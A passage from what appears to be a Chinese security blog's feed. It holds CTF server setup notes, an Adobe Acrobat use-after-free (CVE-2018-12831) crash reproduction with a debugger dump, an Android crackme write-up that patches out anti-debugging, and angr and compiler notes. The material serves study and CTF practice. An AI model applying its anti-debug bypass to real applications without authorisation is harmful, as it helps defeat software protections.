class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[!] Error on &#123;0&#125; , &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(item, e))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;[*] All done, have a nice day :)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 : 参考"></a>0x03 : 参考</h4><p><a href="https://www.v2ex.com/t/389533">10.13 升级后，多出了很大一块隐藏空间，不能用也删除不了？– v2ex</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
  </entry>
  <entry>
    <title>比赛运维杂记</title>
    <url>/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 : 前言"></a>0x00 : 前言</h2><p>又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。</p>
<a id="more"></a>

<h2 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01 基本信息"></a>0x01 基本信息</h2><p>查看基本信息<code>uname -a</code> 或者 <code>cat /proc/version </code><br>查看<code>centOS</code> 系统版本 <code>rpm -q centos-release</code></p>
<h2 id="0x02-更新-centOS为例"><a href="#0x02-更新-centOS为例" class="headerlink" title="0x02 更新(centOS为例)"></a>0x02 更新(centOS为例)</h2><h3 id="1-备份"><a href="#1-备份" class="headerlink" title="1.备份"></a>1.备份</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>

<h3 id="2-下载yum配置文件"><a href="#2-下载yum配置文件" class="headerlink" title="2.下载yum配置文件"></a>2.下载yum配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/ </span><br><span class="line">wget http://mirrors.163.com/.<span class="built_in">help</span>/CentOS6-Base-163.repo</span><br></pre></td></tr></table></figure>

<h3 id="3-生成缓存"><a href="#3-生成缓存" class="headerlink" title="3.生成缓存"></a>3.生成缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h3 id="4-更新"><a href="#4-更新" class="headerlink" title="4.更新"></a>4.更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<p>安装32位库 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install xulrunner.i686</span><br></pre></td></tr></table></figure>

<h2 id="0x03-守护进程的配置"><a href="#0x03-守护进程的配置" class="headerlink" title="0x03 守护进程的配置"></a>0x03 守护进程的配置</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install xinetd</span><br></pre></td></tr></table></figure>

<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><p><code>/etc/services</code> 下先添加自己的服务端口信息<br><code>/etc/xinetd.d/</code> 下添加自己的服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service pwn_test</span><br><span class="line">&#123;</span><br><span class="line">    disable &#x3D; no &#x2F;&#x2F;打开</span><br><span class="line">    port &#x3D; 50001 </span><br><span class="line">    socket_type &#x3D; stream</span><br><span class="line">    server &#x3D; &#x2F;home&#x2F;pwn100&#x2F;pwn100</span><br><span class="line">    wait &#x3D; no </span><br><span class="line">    user &#x3D; pwn_user</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后重启服务就好了<code>service xinetd restart</code></p>
<h2 id="0x04-socat"><a href="#0x04-socat" class="headerlink" title="0x04 socat"></a>0x04 socat</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget –no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo </span><br><span class="line">yum makecache</span><br><span class="line">yum install socat</span><br></pre></td></tr></table></figure>

<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>如果要socat去配置pwn服务，写一个bash脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>给x权限后运行即可</p>
<h2 id="0x05-其他杂项配置"><a href="#0x05-其他杂项配置" class="headerlink" title="0x05 其他杂项配置"></a>0x05 其他杂项配置</h2><p>安装32bit库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686</span><br></pre></td></tr></table></figure>

<h2 id="0x06-抓流量"><a href="#0x06-抓流量" class="headerlink" title="0x06 抓流量"></a>0x06 抓流量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh </span></span><br><span class="line">file_path=<span class="string">"/home/sycfiles/pwn_log/"</span></span><br><span class="line">file_name=`date <span class="string">"+%H%M"</span>`</span><br><span class="line">path=<span class="variable">$file_path</span><span class="variable">$file_name</span></span><br><span class="line">killall  tcpdump233</span><br><span class="line">nohup tcpdump233 -i eth1 tcp port 50001 -w <span class="variable">$path</span>  &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0 */1 * * * 用户 脚本路径</span></span><br><span class="line">0 */1 * * *  root   /root/pwn_log.sh</span><br></pre></td></tr></table></figure>

<h2 id="0x07-其他"><a href="#0x07-其他" class="headerlink" title="0x07 其他"></a>0x07 其他</h2><p>主要是注意目录、文件权限以及fork炸弹之类的搅屎棍行为的限制，最好还是docker吧，比较方便。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>由CVE-2018-12831引发的一些思考</title>
    <url>/2018/12/13/%E7%94%B1CVE-2018-12831%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 : 前言"></a>0x00 : 前言</h4><p>这是一个很奇怪的case，在我还在学校的时候对Adobe Reader日常逆向的时候意外发现的一个UAF漏洞，很不幸的是无法利用；但是有趣的是他的触发方式，在后面的工作中，我在Foxit中意外发现了类似的问题，就在昨天，Adobe更新最新补丁之后，也发现了一个类似的UAF(0day,已提交给厂商)，这个0day不在本文讨论范围之内。</p>
<a id="more"></a>

<h4 id="0x01-漏洞情况"><a href="#0x01-漏洞情况" class="headerlink" title="0x01 : 漏洞情况"></a>0x01 : 漏洞情况</h4><h5 id="漏洞的基本信息如下"><a href="#漏洞的基本信息如下" class="headerlink" title="漏洞的基本信息如下:"></a>漏洞的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12831">基本信息</a>如下:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Adobe Acrobat and Reader versions 2018.011.20063 and earlier, 2017.011.30102 and earlier, and 2015.006.30452 and earlier have an use after free vulnerability. Successful exploitation could lead to arbitrary code execution.</span><br></pre></td></tr></table></figure>

<p>是一个很鸡肋的UseAfterFree的鸡肋漏洞，我个人认为无法利用 :(</p>
<p>这个漏洞发现的很意外，算是无心插柳，我们都知道可以使用<code>vbs</code>脚本调用一些windows的api，然后去完成一些窗口操作，下面来看一下这段vbs脚本：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REM</span>: Save a Pdf as JPEG.</span><br><span class="line"> <span class="keyword">REM</span>:Also Multipage PDF will can be changed. <span class="keyword">Then</span> every page will be saved as single JPEG</span><br><span class="line"> <span class="keyword">REM</span>: The Filename you can change <span class="keyword">to</span> your needs.</span><br><span class="line"> <span class="keyword">REM</span>: <span class="keyword">If</span> you use Drag&amp;drop <span class="keyword">or</span> Filename as command</span><br><span class="line"> <span class="keyword">REM</span>: line argument the script will work <span class="keyword">with</span> this file.</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;*********Settings in File**************************</span></span><br><span class="line">FileNM = <span class="string">&quot;C:\Users\muhe\Desktop\x.pdf&quot;</span> <span class="comment">&#x27;//Filename for File to transfer if NO argument is given</span></span><br><span class="line"><span class="comment">&#x27;****************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> WshShell = <span class="built_in">CreateObject</span> (<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line"><span class="keyword">set</span> fs = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</span><br><span class="line"><span class="keyword">if</span> objArgs.Count = <span class="number">1</span> <span class="keyword">then</span> FileNM = ObjArgs(<span class="number">0</span>)</span><br><span class="line">Info = <span class="string">&quot;Save as JPEG&quot;</span>&amp;VbCr&amp;_</span><br><span class="line">       <span class="string">&quot;File Name: &quot;</span>&amp;FileNM &amp;vbCr&amp;<span class="string">&quot; Delete existing JPEG FILES with the same Name before!&quot;</span>&amp;vbcr&amp;<span class="string">&quot; Start now?&quot;</span></span><br><span class="line">OK = <span class="built_in">MsgBox</span>(Info, vbQuestion+vbYesNo,<span class="string">&quot;Insert Files&quot;</span>) : <span class="keyword">if</span> OK = vbNo <span class="keyword">then</span> WScript.quit</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;//Start or switch to Acrobat</span></span><br><span class="line">WshShell.run <span class="string">&quot;Acrobat.exe&quot;</span></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">not</span> WshShell.AppActivate(<span class="string">&quot;Adobe Acrobat&quot;</span>) : Wscript.Sleep <span class="number">1000</span> : <span class="keyword">Wend</span></span><br><span class="line"><span class="keyword">Set</span> gApp = <span class="built_in">CreateObject</span>(<span class="string">&quot;AcroExch.App&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> fs.FileExists(FILENM) <span class="keyword">then</span></span><br><span class="line">     MsgBox <span class="string">&quot;Ups! &quot;</span> &amp; FileNM &amp; <span class="string">&quot; doesn&#x27;t exist? &quot;</span> &amp; <span class="string">&quot;Try new!&quot;</span>, vbExclamation</span><br><span class="line">     WScript.quit</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> BASFL = <span class="built_in">CreateObject</span>(<span class="string">&quot;AcroExch.pdDoc&quot;</span>)</span><br><span class="line">OK = BASFL.Open(FileNM) <span class="comment">&#x27;//Open the PDF-File</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> OK <span class="keyword">Then</span> <span class="keyword">if</span> <span class="built_in">MsgBox</span>(<span class="string">&quot;Error open Basic File&quot;</span>) <span class="keyword">then</span> Wscript.quit</span><br><span class="line">BASFL.OpenAVDoc(<span class="built_in">mid</span>(FileNM,<span class="built_in">InstrRev</span>(FileNM,<span class="string">&quot;\&quot;</span>)+<span class="number">1</span>)) <span class="comment">&#x27;// get the PDF-File into view</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;// to get this part working reliable(!) use WinAPI, WMI, or AutoITX.dll to check the forground window</span></span><br><span class="line"></span><br><span class="line">WshShell.SendKeys <span class="string">&quot;^+s&quot;</span> <span class="comment">&#x27;// send keys for SaveAs</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span></span><br><span class="line">WshShell.SendKeys <span class="string">&quot;&#123;tab&#125;&quot;</span> <span class="comment">&#x27;// goto Filetype</span></span><br><span class="line">WScript.Sleep <span class="number">500</span></span><br><span class="line">WshShell.SendKeys <span class="string">&quot;J&quot;</span> <span class="comment">&#x27;// switch filetype zu JPEG</span></span><br><span class="line">WScript.Sleep <span class="number">500</span></span><br><span class="line">WshShell.SendKeys <span class="string">&quot;&#123;tab&#125;&#123;Enter&#125;&quot;</span> <span class="comment">&#x27;// switsch to &quot;Save&quot; and save</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> BASFL = <span class="literal">nothing</span> : <span class="keyword">set</span> gApp = <span class="literal">nothing</span></span><br></pre></td></tr></table></figure>

<p>脚本来自网上，当时晚上随便看reader攻击面的时候随手找到的一个转换脚本，这个脚本的功能的调用<code>Adobe Acrobat DC Pro</code>的转换模块，把pdf转成图片。</p>
<p>其实脚本看起来没有任何问题，而且我使用的<code>x.pdf</code>也没有什么特殊支持，随便一个pdf文件都可以触发这个洞。问题不在于内存，在于逻辑。</p>
<h5 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h5><ol>
<li>第一次运行<code>vbs</code>脚本启动转换，此时没有任何问题，这时候不要kill掉<code>Acrobat.exe</code>。</li>
<li>然后再次运行<code>vbs</code>脚本，因为<code>Reader</code>是单进程的，多的tab标签会以单独的线程体现，所以这个时候你不会看到第二次被打开的文件。</li>
<li>关闭已打开的pdf标签</li>
<li>crash</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0:029&gt; g</span><br><span class="line">(874.74c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">*** ERROR: Symbol file could not be found. Defaulted to <span class="built_in">export</span> symbols <span class="keyword">for</span> Acrobat.dll -</span><br><span class="line">Acrobat_6c400000!DllCanUnloadNow+0x591d3:</span><br><span class="line">6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=?? ??????</span><br><span class="line">0:000:x86&gt; r</span><br><span class="line">eax=2b208b98 ebx=00000001 ecx=2b208b98 edx=03c51138 esi=2b96edb0 edi=0000000 1</span><br><span class="line">eip=6c4d7318 esp=0021f308 ebp=0021f308 iopl=0</span><br><span class="line">c</span><br><span class="line">cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b</span><br><span class="line">2</span><br><span class="line">Acrobat_6c400000!DllCanUnloadNow+0x591d3:</span><br><span class="line">6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=??</span><br><span class="line">??????</span><br><span class="line">0:000:x86&gt; dd ecx</span><br><span class="line">2b208b98  ???????? ???????? ???????? ????????</span><br><span class="line">2b208ba8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bb8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bc8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bd8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208be8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bf8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208c08  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<p>具体的漏洞分析的细节不再细述，逆向的工作量比较大，主要是管理PDDoc对象的问题。当时厂商也说这个问题好像有点复杂，他们需要做更多的测试工作，所以差不多从五月报告，到修复，我等了差不多四五个月的样子:( </p>
<h4 id="0x02-类似的情况"><a href="#0x02-类似的情况" class="headerlink" title="0x02 : 类似的情况"></a>0x02 : 类似的情况</h4><p>很有意思的是，我在<code>Adobe Reader</code>系列、<code>Foxit</code>都发现过类似的情况，正常的文件，但是操作逻辑不正常，导致下层代码产生崩溃，比如一些数据不同步的情况(Foixt的一个洞)。</p>
<p>还有就是SourceTree的Windows版也有这样的问题，但是是个空指针，没人理吧估计。 就是在进行配置的时候，不按照他指示的逻辑向下进行，就会触发这个空指针。(依然没有修复，发了邮件也不理 T_T)</p>
<p>本月(2018.12)我又交了一个<code>Adobe Acrobat DC Pro</code>的越界读，也是这种类似的漏洞(鸡肋又没用)，完全正常的代码、文件，只是因为操作逻辑不对导致了程序崩溃。说实话我也不是很明白为什么会出现这么奇怪的<code>bug</code>，我每次都是在找攻击面、测试自己写的东西的时候发现的这些奇怪的bug。</p>
<h4 id="0x03-引发的一点思考"><a href="#0x03-引发的一点思考" class="headerlink" title="0x03 : 引发的一点思考"></a>0x03 : 引发的一点思考</h4><p>在程序的复杂度剧增的现在，用了很多设计模式、框架糅合的程序的确很难保证没有类似的bug出现，比如Adobe这种支持很多功能、插件的PDF阅读器，在逆向的时候就发现了一层又一层的封装以及一些设计模式，搞得人一个头两个大。</p>
<p>上层的操作逻辑对下层代码的影响有时候真的很难考虑周全，或者说测试的时候也没往这个方向想，所以导致一些bug的出现，不过我估计除了安全研究员也没人去往这个方向搞 :(   我个人也没有什么开发相关的经验，就存在一个疑问:这部分问题怎么避免or及早发现? </p>
<p>最近也看到James的几个本地提权的洞，不由感叹逻辑洞是真牛逼，以后还是要多往这个方向想想。不过像Reader这种思路逻辑洞就只在穿sanbox的时候有见过？ 至今还记得zdi之前一波利用 <code>__defGetter__</code>和<code>__defSetter__</code>调用到特权api的那套骚操作…不过也被封的差不多了，基本gg :( </p>
<p>最后吐槽一下，洞好难挖…</p>
<h4 id="0x04-其他人的工作"><a href="#0x04-其他人的工作" class="headerlink" title="0x04 : 其他人的工作"></a>0x04 : 其他人的工作</h4><p><code>QuBo</code> &amp;&amp; <code>heige</code> 在kcon2018上的议题涉及到了一小部分这样的，只是他们做的更完善，在fuzz内存破坏漏洞、加入了操作逻辑的fuzz，就产生了一些很奇怪的case，比如点击xx下崩溃，以xx分辨率打开然后xxx崩溃…</p>
<p>很有意思的分享，虽然这类洞利用的可能性微乎其微（个人认为没有），但是很有趣，也是枯燥的漏洞挖掘生活中的一丝乐趣。</p>
<h4 id="0x05-致谢信息"><a href="#0x05-致谢信息" class="headerlink" title="0x05 : 致谢信息"></a>0x05 : 致谢信息</h4><p><a href="https://helpx.adobe.com/security/products/acrobat/apsb18-30.html">Zhenjie Jia of Qihoo 360 Vulcan Team (CVE-2018-12831) </a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>第一个android cm调试分析</title>
    <url>/2016/06/29/%E7%AC%AC%E4%B8%80%E4%B8%AAandroid-cm%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00:写在前面"></a>0x00:写在前面</h4><p>一直想入门Android安全，当时是极客大挑战出题的时候，被cx表哥甩锅强行去学了点android的开发，之后慢慢接触，感觉还是挺有意思的。cx表哥说先从逆向分析入门吧，之后可以搞加固/漏洞方向。<br>这篇文章是在学习蒸米的文章七武器的一个记录。</p>
<a id="more"></a>


<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p> 这次记录的是2014阿里移动挑战赛里的一个简单的cm的分析，主要是native层的调试和对简单反调试的bypass。<br>因为原来自用的三星放家里了，就只能使用模拟器来搞了，坑还是不少。</p>
<ul>
<li>   本来我是想用Genymotion的，但是这个模拟器是x86构架,IDA的调试的server并没有支持的，只能用Android Studio自带的模拟器。</li>
<li>   使用模拟器调试so里的代码时有问题(后面会提到)</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/run_app.jpg"></p>
<p>对于我这样的新手，我一般会把apk拖进jeb直接分析看看，这个apk的验证是在so中做的验证，所以使用IDA对so做初步的分析。</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h4><pre><code>找到验证的函数</code></pre>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/ida_view.jpg"><br>根据以前搞pc端的经验，下一步直接起调试器，对这个函数下断点，单步跟就好了。但是这个程序在IDA attach上之后程序就退出了，需要对JNI_Onload()函数进行调试分析。<br>根据蒸米的文章，步骤如下<br>    首先是上传IDA的server到模拟器中，这里我遇到了一个问题<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/read_only_system.png"><br>提示只读，对应的解决方法是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@generic:&#x2F; # umount &#x2F;</span><br><span class="line">root@generic:&#x2F; # mount  -o remount rw &#x2F;</span><br></pre></td></tr></table></figure>
<p>之后再上传运行就可以啦。<br>然后，需要端口转发 <code>adb forward tcp:23946 tcp:23946</code>一般IDA去attach的时候这个函数早就执行过了，所以需要调试JNI_Onload()；因为需要用到jdb，所以需要打开ddms。<br>之后再使用adb以调试的模式启动程序<code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/wait_for_debugger.png"><br>IDA里attach</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/attach_with_IDA.png"><br>设置调试选项后F9</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/debug_opt.png"><br>此时使用jdb工具恢复程序<code>jdb.exe -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code>；<br>然后对含有验证算法的so的JNI_Onload()方法下断点，F9，就断下来了。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/debug_begin.png"></p>
<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03:"></a>0x03:</h4><p>使用IDA调试方便在于，使用P将代码块识别成函数后，可以直接F5。单步执行到</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/fuck-debug.png"><br>之后，就跑飞了，应该是有反调试，F7进去看看是什么反调试。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/f7.png"><br>应该是创建子进程去检测有没有调试器了。 so中的反调试策略应该和linux那些差不多，这个so中的检测方式是，打开/proc/[pid]/status文件，检测tracerpid的值是不是0。<br>那么对应的策略有两种，要么调试的时候动态改寄存器，或者改跳；或者一劳永逸，直接patch掉这个so。在分析了这个so反调试所在的函数后，我选择后种方案</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/find_d-debug.png"></p>
<p>死循环调用来检测调试，还是patch来的方便些。</p>
<ul>
<li><p>   在调试的时候我遇到这样一个问题，F7/F8都没法执行下去。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/ida_avd_bug.png"></p>
</li>
<li><p> 问了cx表哥后，表哥说这是模拟器才有的问题…在出问题的代码上下断，然后F9过去就好了。<br>  这样的确可以解决问题，但是在调试的时候遇到好几次这样的问题，每次遇到了都要全部重新来过，太麻烦了，还是真机调试好QAQ</p>
</li>
</ul>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h4><p>patch这个so的时候，蒸米使用的那个IDA的插件我没找到，所以我选择反编译这个apk，然后修改了so文件后，重打包签名弄回去 =。=<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/patch.png"></p>
<p>修改0x16B8处的指令就好了,这里采用蒸米的方案，使用movs r0,r0作为NOP指令。<br>修改后使用apktools打包回去，再使用签名工具签名就好了。再次安装已经patch好的apk，重复之前调试的步骤，这次对Java_com_yaotong_crackme_MainActivity_securityCheck方法下断点，<br>回到模拟器里随便输入点什么，按下输入密码按钮，IDA里就断下来了，就可以愉快的单步调试了。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/0x4_debug.png"></p>
<p>双开IDA可以辅助分析，这个地方就是加密的字符串所在的地址<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/0x4_3.png"><br>点进去之后查看<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/0x4_4.png"></p>
<p>再查看这个地址<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/0x4_5.png"><br><code>aiyou,bucuoo</code><br>这应该就是flag了</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/android_cm/0x4_6.png"></p>
<h4 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04:"></a>0x04:</h4><p> 第一次调试native层的东西，还是学到了不少，也遇到了这样那样的小问题，不过还是完成了。</p>
<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05:参考"></a>0x05:参考</h4><p><a href="http://drops.wooyun.org/tips/6840">安卓动态调试七种武器之孔雀翎 – Ida Pro</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的尝试angr</title>
    <url>/2016/08/01/%E7%AE%80%E5%8D%95%E7%9A%84%E5%B0%9D%E8%AF%95angr/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>之前接触到了符号执行，可以用于程序的自动化分析，感觉还是比较神奇，工业上的具体用法不是很清楚，不过在CTF中这个东西慢慢在流行…从defcon 2016就可以看出(有很多人解re用符号执行)。常用的库有angr、z3，我只尝试了angr。</p>
<a id="more"></a>

<h4 id="0x01-关于符号执行"><a href="#0x01-关于符号执行" class="headerlink" title="0x01:关于符号执行"></a>0x01:关于符号执行</h4><p>以下来自维基百科：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。</span><br></pre></td></tr></table></figure>
<p>这个东西的详细资料可以google得到，github上也有一些介绍和demo。</p>
<h4 id="0x02-简单的使用"><a href="#0x02-简单的使用" class="headerlink" title="0x02:简单的使用"></a>0x02:简单的使用</h4><p>对于CTF中的re题目来说，一些流程繁琐，代码量大的题目简直是体力活，做的人心力交瘁…举个简单的例子，之前听chxx表哥分享过一种代码混淆的技术叫控制流平坦化，用IDA打开视图简直是噩梦…如果是那种很复杂的，真的是爆炸，这里只用一个很简单的文件来演示。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/blog_angr/ida_view.png"><br>其实这段代码没多长，几十行，判断的逻辑也很简单，但是就是利用几个变量在控制程序流程，跳来跳去，分析起来十分麻烦。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/blog_angr/try.png"></p>
<p>如果使用符号执行去解决就会使问题变得很简单<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/blog_angr/solve_py.png"><br>跑符号执行的机器配置要好些，这个东西太吃内存了,程序的复杂度和你代码约束条件写的如何，将决定你能不能跑出结果，因为这个程序很简单，所以很快就跑出来了。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/blog_angr/result.png"><br>大概 几十秒…</p>
<h4 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03:其他"></a>0x03:其他</h4><p>个人感觉，angr的官方文档还不错，结合文档和官方给出的example应该可以学会使用这个库。但是符号执行也是有局限性的，不能盲目地去跑(如果你以为随便设定find 和 avoid 就可以跑出结果，那就太naive了)根据程序获取输入的方式不同，angr有不同的处理，还有一些筛选功能，这部分就可以看看文档啦，都比较容易懂。研究深入的话，这个东西还是很复杂的，我现在只想会使用这个工具就好，还有很多要学TAT。</p>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h4><p>最近发现一个其他的用途，在分析pwn类型题目的二进制文件的时候，适当的使用angr来测试一些执行路径也是可以的…不过还是不能太依赖，更多的时候还是要人肉分析+调试。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理学习</title>
    <url>/2017/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="0x00-关于编译原理"><a href="#0x00-关于编译原理" class="headerlink" title="0x00: 关于编译原理"></a>0x00: 关于编译原理</h4><p>程序员的三大浪漫之一，二进制选手必修课。所以毅然决然开坑了，开始看网易云课堂的mooc，也看了Coursera上的Compilers课程，感觉后者更好一点，就是看起来很费力。书的话还没找到合适的，倒是有几本参考：</p>
<ul>
<li>   龙书</li>
<li> 虎书</li>
<li> 图解编译原理</li>
<li> 自制编译器</li>
</ul>
<p>但是个人并不是很清楚如何选择，我的方法是看书+看mooc，然后写代码实践，本来这就是一门理论+实践的课程。</p>
<a id="more"></a>

<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><pre><code>过程</code></pre>
<ol>
<li>词法分析（program text 分割成 words 或者 tokens）</li>
<li>解析（语法树）</li>
<li>语法分析（理解“含义”）</li>
<li>中间优化（little bit like editing，作文的润色？为了运行的更快、使用更少的内存等）</li>
<li>代码生成 （assembly code）</li>
</ol>
